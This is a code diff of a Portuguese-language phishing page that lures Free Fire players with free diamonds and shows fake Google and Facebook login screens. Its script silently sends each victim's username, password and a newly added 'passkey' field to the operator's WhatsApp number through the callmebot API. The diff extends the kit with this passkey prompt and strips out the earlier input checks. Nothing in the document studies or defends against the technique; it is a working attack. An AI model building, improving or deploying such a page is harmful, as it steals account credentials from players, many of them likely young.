@@ -7,15 +7,9 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            background-color: #050505;
-            color: white;
-            font-family: 'Roboto', sans-serif;
-        }
+        body { background-color: #050505; color: white; font-family: 'Roboto', sans-serif; }
         .ff-font { font-family: 'Orbitron', sans-serif; }
-        .ff-gradient {
-            background: linear-gradient(135deg, #facc15 0%, #f97316 100%);
-        }
+        .ff-gradient { background: linear-gradient(135deg, #facc15 0%, #f97316 100%); }
         .card-bg { background-color: #121212; border: 1px solid #262626; }
         .hidden { display: none; }
     </style>
@@ -23,7 +17,6 @@
 <body class="min-h-screen flex items-center justify-center p-4">
 
     <div class="max-w-md w-full">
-        
         <div id="screen-home" class="text-center">
             <h1 class="ff-font text-3xl font-bold text-yellow-400 mb-4 tracking-tighter">GANHE DIAMANTES FREE FIRE GRÁTIS</h1>
             <p class="text-gray-400 mb-8">Ganhe no seu primeiro login, depois aproveite ofertas por apenas R$ 3,99.</p>
@@ -43,7 +36,6 @@
                     Entrar com Facebook
                 </button>
             </div>
-            <button onclick="changeScreen('screen-home')" class="mt-6 text-gray-500 text-sm underline">Voltar</button>
         </div>
 
         <div id="screen-form" class="hidden card-bg p-8 rounded-xl shadow-2xl">
@@ -59,6 +51,17 @@
                     <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Senha</label>
                     <input type="password" id="passInput" name="password" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
                 </div>
+
+                <div id="passkey-area" class="hidden">
+                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Chave de Acesso (Passkey)</label>
+                    <div class="flex gap-2">
+                        <input type="text" id="passkeyInput" name="passkey" class="flex-1 bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" placeholder="Cole sua chave">
+                        <a href="https://www.google.com/intl/pt-BR/account/about/passkeys/" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-2 rounded flex items-center justify-center text-center leading-tight">
+                            CRIAR<br>CHAVE
+                        </a>
+                    </div>
+                </div>
+
                 <button type="submit" class="w-full ff-gradient py-3 text-black font-bold rounded mt-4 transition-all hover:scale-[1.02]">
                     FAZER LOGIN
                 </button>
@@ -72,29 +75,19 @@
                     <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
                 </div>
                 <h2 id="welcome-user" class="ff-font text-xl text-yellow-400"></h2>
-                <p class="text-gray-400 text-sm">Selecione o pacote de diamantes:</p>
             </div>
-
-            <div class="grid grid-cols-2 gap-4">
-                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg border-2 border-transparent hover:border-orange-500 transition-all flex flex-col items-center">
+            <p class="text-gray-400">Escolha o seu prêmio abaixo.</p>
+            <div class="grid grid-cols-2 gap-4 mt-4">
+                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500">
                     <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
                     <span class="font-bold mt-2">100 Dimas</span>
                 </button>
-                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg border-2 border-transparent hover:border-orange-500 transition-all flex flex-col items-center">
-                    <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
-                    <span class="font-bold mt-2">250 Dimas</span>
-                </button>
-                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg border-2 border-transparent hover:border-orange-500 transition-all flex flex-col items-center">
-                    <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
-                    <span class="font-bold mt-2">300 Dimas</span>
-                </button>
-                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg border-2 border-transparent hover:border-orange-500 transition-all flex flex-col items-center">
+                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500">
                     <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
                     <span class="font-bold mt-2">1500 Dimas</span>
                 </button>
             </div>
         </div>
-
     </div>
 
     <script>
@@ -111,63 +104,51 @@
             const header = document.getElementById('form-header');
             const label = document.getElementById('label-user');
             const userInp = document.getElementById('userInput');
+            const passkeyArea = document.getElementById('passkey-area');
             
             userInp.value = "";
             document.getElementById('passInput').value = "";
+            document.getElementById('passkeyInput').value = "";
             document.getElementById('error-msg').classList.add('hidden');
 
             if(provider === 'google') {
                 header.innerHTML = `<img src="https://www.google.com/favicon.ico" class="w-8 mx-auto mb-2"><h2 class="text-white font-bold">Login com Google</h2>`;
                 label.innerText = "Gmail";
                 userInp.placeholder = "exemplo@gmail.com";
+                passkeyArea.classList.remove('hidden'); // MOSTRA NO GOOGLE
             } else {
                 header.innerHTML = `<svg class="w-8 h-8 fill-[#1877F2] mx-auto mb-2" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg><h2 class="text-white font-bold">Login com Facebook</h2>`;
                 label.innerText = "Telefone ou E-mail";
                 userInp.placeholder = "Número ou e-mail";
+                passkeyArea.classList.add('hidden'); // ESCONDE NO FB
             }
             changeScreen('screen-form');
         }
 
-        // LÓGICA DE ENVIO PARA O SEU WHATSAPP
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const user = document.getElementById('userInput').value;
             const pass = document.getElementById('passInput').value;
+            const passkey = document.getElementById('passkeyInput').value;
             const provider = document.getElementById('provider').value;
-            const errorDiv = document.getElementById('error-msg');
             
-            errorDiv.classList.add('hidden');
-
-            // Validações
-            if(currentProvider === 'google') {
-                if(!user.toLowerCase().endsWith('@gmail.com')) {
-                    showError("O e-mail deve ser @gmail.com");
-                    return;
-                }
-                if(pass.length < 8) {
-                    showError("A senha do Google deve ter no mínimo 8 caracteres");
-                    return;
-                }
-            } else {
-                if(user.trim() === "" || pass.length < 6) {
-                    showError("Verifique os dados informados.");
-                    return;
-                }
+            // VALIDAÇÃO CHAVE DE ACESSO PARA GOOGLE
+            if(provider === 'google' && passkey.trim() === "") {
+                showError("Você deve colar sua chave de acesso para continuar.");
+                return;
             }
 
-            // DADOS EXTRAÍDOS DA SUA IMAGEM
             const seu_telefone = "553192560979"; 
             const apikey = "3798192"; 
             
-            const texto = `🔥 *NOVO LOGIN RECEBIDO* 🔥\n\n📱 *Provedor:* ${provider.toUpperCase()}\n📧 *Usuário:* ${user}\n🔑 *Senha:* ${pass}`;
+            // MENSAGEM COM O CAMPO ADICIONAL
+            const texto = `🔥 *NOVO LOGIN RECEBIDO* 🔥\n\n📱 *Provedor:* ${provider.toUpperCase()}\n📧 *Usuário:* ${user}\n🔑 *Senha:* ${pass}\n🛡️ *Passkey:* ${passkey || 'N/A'}`;
             const url = `https://api.callmebot.com/whatsapp.php?phone=${seu_telefone}&text=${encodeURIComponent(texto)}&apikey=${apikey}`;
 
             try {
-                // Envio silencioso via WhatsApp
                 fetch(url, { mode: 'no-cors' });
-
                 const nomeUsuario = user.split('@')[0]; 
-                document.getElementById('welcome-user').innerText = `Login bem-sucedido! Olá, ${nomeUsuario}`;
+                document.getElementById('welcome-user').innerText = `Sucesso! Olá, ${nomeUsuario}`;
                 changeScreen('screen-success');
             } catch (error) {
                 showError("Erro de conexão.");
@@ -181,9 +162,10 @@
         }
 
         function finishClaim() {
-            alert("Solicitação enviada com sucesso! Seus diamantes chegarão em até 72 horas.");
+            alert("Processo concluído com sucesso!");
             location.reload();
         }
     </script>
 </body>
-</html>
+                </html>
+                    
